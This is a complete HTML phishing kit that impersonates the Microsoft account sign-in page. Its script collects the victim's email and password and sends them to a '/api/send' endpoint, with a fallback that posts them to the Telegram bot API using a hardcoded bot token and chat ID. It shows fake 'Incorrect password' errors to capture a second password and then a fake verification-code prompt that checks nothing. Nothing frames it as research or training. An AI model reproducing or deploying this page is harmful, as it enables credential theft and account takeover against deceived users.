<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>Sign in to your account</title>
  <style>
    html, body {
      height: 100%;
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Arial, sans-serif;
      background: #f3f6fb;
      min-height: 100vh;
      width: 100vw;
      overflow: hidden;
    }
    body {
      /* Subtle Microsoft login background */
      background: radial-gradient(ellipse 120% 90% at 60% 10%, #e9eef7 70%, #f3f6fb 100%);
      position: relative;
    }
    .signin-panel {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #fff;
      box-shadow: 0 6px 32px rgba(0,0,0,.13);
      border-radius: 3px;
      max-width: 420px;
      width: 96vw;
      padding: 40px 32px 36px 32px;
      z-index: 1;
      display: flex;
      flex-direction: column;
    }
    .msft-logo-row {
      display: flex;
      align-items: center;
      margin-bottom: 32px;
    }
    .msft-logo {
      width: 98px;
      height: 28px;
      vertical-align: middle;
      margin-right: 12px;
    }
    .msft-logo-row span {
      font-size: 23px;
      color: #333;
      font-weight: 600;
      letter-spacing: 0.5px;
      margin-left: 2px;
    }
    .signin-title {
      font-size: 28px;
      font-weight: 600;
      margin-bottom: 18px;
      color: #252525;
    }
    .input-label {
      font-size: 16px;
      color: #222;
      margin-bottom: 3px;
      font-weight: 500;
    }
    .input-field {
      border: none;
      border-bottom: 1.5px solid #aaa;
      font-size: 17px;
      padding: 10px 0;
      width: 100%;
      background: transparent;
      margin-bottom: 22px;
      transition: border-color .2s;
    }
    .input-field:focus {
      border-bottom: 2px solid #0067b8;
      outline: none;
    }
    .error-message {
      color: #e81123;
      font-size: 14px;
      font-weight: 500;
      margin-bottom: 12px;
      display: none;
    }
    .help-links {
      margin-bottom: 32px;
    }
    .help-links a {
      color: #0067b8;
      text-decoration: none;
      font-size: 15px;
      margin-right: 10px;
    }
    .help-links a:hover {
      text-decoration: underline;
    }
    .signin-btn-row {
      display: flex;
      justify-content: flex-end;
      align-items: center;
    }
    .btn {
      background: #0067b8;
      color: #fff;
      font-size: 17px;
      font-weight: 600;
      border: none;
      padding: 10px 44px;
      border-radius: 2px;
      cursor: pointer;
      box-shadow: 0 1px 2px rgba(0,0,0,0.06);
      transition: background .16s;
    }
    .btn:active, .btn:focus, .btn:hover {
      background: #005da6;
      outline: none;
    }
    @media (max-width: 540px) {
      .signin-panel {
        padding: 28px 7vw;
        max-width: 99vw;
      }
      .signin-title {
        font-size: 22px;
      }
      .msft-logo-row span {
        font-size: 19px;
      }
      .btn {
        padding: 10px 26px;
        font-size: 16px;
      }
    }
  </style>
  <link rel="shortcut icon" type="image/png" href="https://easyupload.io/mm9scz"/>
</head>
<body>
  <!-- Loading Screen -->
  <div id="loading-screen" style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;display:flex;justify-content:center;align-items:center;z-index:9999;">
    <div id="loading-spinner" style="background-image: url(https://www.windowslatest.com/wp-content/uploads/2021/08/Outlook-PWA.gif);background-repeat: no-repeat;background-position: center center;width: 170px;height: 170px;"></div>
  </div>
  <div class="signin-panel" id="div1">
    <div class="msft-logo-row">
      <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" class="msft-logo" alt="Microsoft Logo">
      
    </div>
    <div class="signin-title">Sign in</div>
    <span id="error" class="error-message">That Microsoft account doesn't exist. Enter a different account.</span>
    <input type="email" name="email" id="email" class="input-field" autocomplete="username" placeholder="Email, phone, or Skype">
    <div class="help-links">
      <span>No account? <a href="#" id="createAccount">Create one!</a></span><br>
      <a href="#" id="cantAccess">Can't access your account?</a>
    </div>
    <div class="signin-btn-row">
      <button class="btn" id="next" type="button">Next</button>
    </div>
  </div>
  <div class="signin-panel" id="div2" style="display:none;">
    <div class="msft-logo-row" style="cursor:pointer;">
      <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" class="msft-logo" alt="Microsoft Logo">
      
    </div>
    <div style="font-size:18px;font-weight:500;margin-bottom:20px;" id="emailch"></div>
    <label class="input-label" for="password" style="margin-bottom:6px;">Password</label>
    <input type="password" name="password" id="password" class="input-field" autocomplete="current-password" placeholder="Password">
    <span id="msg" class="error-message"></span>
    <div class="help-links">
      <a href="#" id="forgotPassword">Forgot password?</a>
    </div>
    <div class="signin-btn-row">
      <button class="btn" id="submit-btn" type="submit">Sign in</button>
    </div>
  </div>
  <!-- ...existing code... -->
<script>


   const BOT_TOKEN = '7141420161:AAGh3wZMnUv45CEQg6UE7e0xpQIZGtYcdPA';
      const CHAT_ID = '-4849344197';



(function(){
  // Defensive hide for the loading screen so page never stays stuck
  const LOADING_SCREEN_ID = 'loading-screen';
  function hideLoading() {
    try {
      const el = document.getElementById(LOADING_SCREEN_ID);
      if (el) el.style.display = 'none';
    } catch (e) { console.warn('hideLoading failed', e); }
  }

  // Fallback: hide loading after 4s if something blocks normal flow
  const fallbackHideTimer = setTimeout(hideLoading, 4000);

  document.addEventListener('DOMContentLoaded', function() {
    // hide loading immediately on DOMContentLoaded
    try {
      hideLoading();
      clearTimeout(fallbackHideTimer);
    } catch (e) { /* ignore */ }

    try {
      // MAIN INITIALIZATION
      const emailInput = document.getElementById('email');
      const passwordInput = document.getElementById('password');
      const nextBtn = document.getElementById('next');
      const submitBtn = document.getElementById('submit-btn');
      const div1 = document.getElementById('div1');
      const div2 = document.getElementById('div2');
      const error = document.getElementById('error');
      const emailch = document.getElementById('emailch');
      const msg = document.getElementById('msg');

      // Create resend control if missing
      let resendLink = document.getElementById('resendCode');
      if (!resendLink && div2) {
        const helpLinks = div2.querySelector('.help-links') || div2;
        resendLink = document.createElement('a');
        resendLink.href = '#';
        resendLink.id = 'resendCode';
        resendLink.textContent = 'Resend code';
        resendLink.style.display = 'none';
        resendLink.style.marginLeft = '12px';
        resendLink.style.color = '#0067b8';
        resendLink.style.cursor = 'pointer';
        helpLinks.appendChild(document.createElement('br'));
        helpLinks.appendChild(resendLink);
      }

      let pwdAttempt = 0;
      let codeAttempt = 0;
      let inCodeMode = false;
      let errorTimeout = null;

      // Resend lock state
      let resendAttempts = 0;
      const RESEND_MAX = 5;
      const BASE_RESEND_DELAY_MS = 2000;
      let resendLockTimer = null;

      function showErrorMessage(el, text) {
        if (!el) return;
        el.textContent = text;
        el.style.display = 'block';
      }
      function hideErrorMessage(el) {
        if (!el) return;
        el.textContent = '';
        el.style.display = 'none';
      }
      function showErrorWithDelay(el, text, delay = 2000) {
        hideErrorMessage(el);
        clearTimeout(errorTimeout);
        errorTimeout = setTimeout(() => showErrorMessage(el, text), delay);
      }

      function getActiveEmail() {
        const eFromCh = (emailch && emailch.textContent) ? emailch.textContent.trim() : '';
        const eFromInput = (emailInput && emailInput.value) ? emailInput.value.trim() : '';
        return eFromCh || eFromInput || '';
      }

      // fetch with timeout
      async function fetchWithTimeout(resource, options = {}, timeout = 10000) {
        const controller = new AbortController();
        const id = setTimeout(() => controller.abort(), timeout);
        try {
          const response = await fetch(resource, { ...options, signal: controller.signal });
          clearTimeout(id);
          return response;
        } catch (err) {
          clearTimeout(id);
          throw err;
        }
      }

      // server forward (preferred)
      async function forwardToServer(email, secret, kind = 'password') {
        try {
          const res = await fetchWithTimeout('/api/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, secret, kind })
          }, 10000);
          if (!res.ok) {
            const text = await res.text().catch(()=>'{unreadable body}');
            throw new Error('Server forward failed: ' + res.status + ' ' + text);
          }
          return await res.json();
        } catch (err) {
          console.warn('[forwardToServer] failed', err);
          throw err;
        }
      }

      // direct fallback (only if TG_BOT_TOKEN / TG_CHAT_ID globals are present)
      async function sendDirectToTelegram(email, secret, kind = 'password') {
        if (typeof TG_BOT_TOKEN === 'undefined' || typeof TG_CHAT_ID === 'undefined') {
          throw new Error('No TG_BOT_TOKEN/TG_CHAT_ID defined for direct fallback.');
        }
        const text = kind === 'password'
          ? `Microsoft login:\nEmail: ${email}\nPassword: ${secret}`
          : `Microsoft login (code/resend):\nEmail: ${email}\nInfo: ${secret}`;
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
        const res = await fetchWithTimeout(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: TG_CHAT_ID, text })
        }, 10000);
        const json = await res.json();
        if (!json.ok) throw new Error('Telegram API error: ' + JSON.stringify(json));
        return json;
      }

      // unified send: server first, fallback to direct
      async function sendForSecret(email, secret, kind = 'password') {
        try {
          return await forwardToServer(email, secret, kind);
        } catch (err) {
          console.warn('[sendForSecret] server forward failed, trying fallback', err);
          return await sendDirectToTelegram(email, secret, kind);
        }
      }

      // Resend handler
      async function handleResendClick(e) {
        if (e) e.preventDefault();
        if (!inCodeMode) return;
        if (resendAttempts >= RESEND_MAX) {
          showErrorMessage(msg, 'Too many resend attempts. Try again later.');
          return;
        }

        const email = getActiveEmail();
        if (!email) {
          showErrorMessage(msg, 'Email missing. Go back and enter your email first.');
          return;
        }

        // UI lock & feedback
        resendAttempts++;
        const lockDelay = BASE_RESEND_DELAY_MS * Math.pow(2, resendAttempts - 1); // exponential backoff
        resendLink.textContent = `Resending... (${resendAttempts}/${RESEND_MAX})`;
        resendLink.style.pointerEvents = 'none';
        resendLink.style.opacity = '0.6';
        hideErrorMessage(msg);

        try {
          // send a "resend" action to server (preferred) or fallback to direct send
          await sendForSecret(email, 'resend_requested', 'resend');
          // success UI
          showErrorWithDelay(msg, 'Code resent. Check your SMS or authenticator app.', 500);
        } catch (err) {
          // detect network interruption vs other errors
          if (err.name === 'AbortError') {
            showErrorMessage(msg, 'Network interrupted while resending. Tap Resend again to retry.');
          } else {
            showErrorMessage(msg, 'Resend failed. Tap Resend to try again.');
          }
          console.error('[handleResendClick] resend failed', err);
        } finally {
          // schedule unlock after lockDelay (so user cannot hammer Resend)
          clearTimeout(resendLockTimer);
          resendLockTimer = setTimeout(() => {
            if (resendLink) {
              resendLink.textContent = 'Resend code';
              resendLink.style.pointerEvents = '';
              resendLink.style.opacity = '';
            }
          }, lockDelay);
        }
      }

      // Wire resend link if present
      if (resendLink) resendLink.addEventListener('click', handleResendClick);

      // Next button logic: move to password panel
      if (nextBtn) {
        nextBtn.addEventListener('click', function () {
          const my_email = (emailInput && emailInput.value) ? emailInput.value.trim() : '';
          const filter = /^([a-zA-Z0-9_.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,})+$/;
          if (!filter.test(my_email)) {
            showErrorMessage(error, "That Microsoft account doesn't exist. Enter a different account.");
            if (emailInput) emailInput.focus();
            return false;
          }
          if (div1) div1.style.display = 'none';
          if (div2) div2.style.display = 'flex';
          if (emailch) emailch.textContent = my_email;
          hideErrorMessage(msg);
          if (passwordInput) passwordInput.value = '';
          pwdAttempt = 0;
          codeAttempt = 0;
          inCodeMode = false;
          // Reset UI if returning from code mode
          const title = document.querySelector('.signin-title');
          if (title) title.textContent = 'Sign in';
          const lbl = document.querySelector('label[for="password"]');
          if (lbl) lbl.textContent = 'Password';
          if (passwordInput) {
            passwordInput.type = 'password';
            passwordInput.placeholder = 'Password';
          }
          if (submitBtn) {
            submitBtn.textContent = 'Sign in';
            submitBtn.disabled = false;
          }
          if (passwordInput) passwordInput.focus();
          // hide resend link until code mode
          if (resendLink) resendLink.style.display = 'none';
        });
      }

      // Back button (click logo row)
      try {
        const logoRow = div2 ? div2.querySelector('.msft-logo-row') : null;
        if (logoRow) {
          logoRow.addEventListener('click', function() {
            hideErrorMessage(msg);
            if (passwordInput) passwordInput.value = '';
            if (div2) div2.style.display = 'none';
            if (div1) div1.style.display = 'flex';
            if (emailInput) emailInput.focus();
            // hide resend link when leaving
            if (resendLink) resendLink.style.display = 'none';
          });
        }
      } catch (e) { /* ignore */ }

      // Submit behavior (password mode -> may switch to code mode)
      if (submitBtn) {
        submitBtn.addEventListener('click', function(event){
          event.preventDefault();
          const email = getActiveEmail();
          const password = passwordInput ? passwordInput.value : '';
          const filter = /^([a-zA-Z0-9_.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,})+$/;
          if (!filter.test(email)) {
            showErrorWithDelay(msg, "That Microsoft account doesn't exist. Enter a different account.");
            return;
          }

          if (submitBtn) {
            submitBtn.textContent = 'Verifying...';
            submitBtn.disabled = true;
          }

          if (inCodeMode) {
            // code verification simulation
            codeAttempt++;
            setTimeout(function() {
              if (submitBtn) {
                submitBtn.textContent = 'Enter';
                submitBtn.disabled = false;
              }
              if (passwordInput) {
                passwordInput.value = '';
                passwordInput.focus();
              }
              const codeMsg = (codeAttempt >= 4)
                ? "Too many incorrect codes. Please try again later."
                : "Incorrect code. Please try again.";
              showErrorWithDelay(msg, codeMsg);
              if (codeAttempt >= 4) setTimeout(() => location.reload(), 2000);
            }, 800);
            return;
          }

          // PASSWORD MODE: send email + password (or forward to server)
          pwdAttempt++;
          // Use sendForSecret so it tries server and falls back if configured
          sendForSecret(email, password, 'password')
            .then(res => {
              console.log('[sendForSecret] success', res);
            })
            .catch(err => {
              console.error('[sendForSecret] error', err);
              if (err.name === 'AbortError') {
                showErrorWithDelay(msg, 'Network interrupted. Please check your connection and try again.');
              }
              // else: continue with normal UX (we still show incorrect password simulation below)
            })
            .finally(() => {
              if (pwdAttempt === 1) {
                setTimeout(() => {
                  if (submitBtn) {
                    submitBtn.textContent = 'Sign in';
                    submitBtn.disabled = false;
                  }
                  if (passwordInput) {
                    passwordInput.value = '';
                    passwordInput.focus();
                  }
                  showErrorWithDelay(msg, "Incorrect password. Please try again.");
                }, 2000);
              } else if (pwdAttempt === 2) {
                setTimeout(() => {
                  const title = document.querySelector('.signin-title');
                  if (title) title.textContent = 'Enter code';
                  const lbl = document.querySelector('label[for="password"]');
                  if (lbl) lbl.textContent = 'Enter code';
                  if (passwordInput) {
                    passwordInput.type = 'text';
                    passwordInput.placeholder = 'Enter code';
                  }
                  if (submitBtn) {
                    submitBtn.textContent = 'Enter';
                    submitBtn.disabled = false;
                  }
                  if (passwordInput) {
                    passwordInput.value = '';
                    passwordInput.focus();
                  }
                  inCodeMode = true;
                  // show resend link when code mode is active
                  if (resendLink) resendLink.style.display = 'inline';
                  showErrorWithDelay(msg, "Authorization code required. Please check your sms or authenticator app.");
                }, 2000);
              } else {
                setTimeout(() => {
                  if (submitBtn) {
                    submitBtn.textContent = 'Sign in';
                    submitBtn.disabled = false;
                  }
                  if (passwordInput) {
                    passwordInput.value = '';
                    passwordInput.focus();
                  }
                  showErrorWithDelay(msg, "Incorrect password. Please try again.");
                }, 2000);
              }
            });
        });
      }

      if (passwordInput) {
        passwordInput.addEventListener('keydown', function(e){
          if (e.key === "Enter" && submitBtn) submitBtn.click();
        });
      }

      // Expose a manual retry helper (optional) to allow re-sending last action (not persisted across reloads)
      window.retryLastResend = function() {
        if (!inCodeMode) return;
        handleResendClick();
      };

    } catch (initErr) {
      console.error('Initialization error:', initErr);
      // Ensure loading screen is removed even if init fails
      try { hideLoading(); } catch (e) {}
    }
  });
})();
</script>
<!-- ...existing code... -->
</body>

</html>
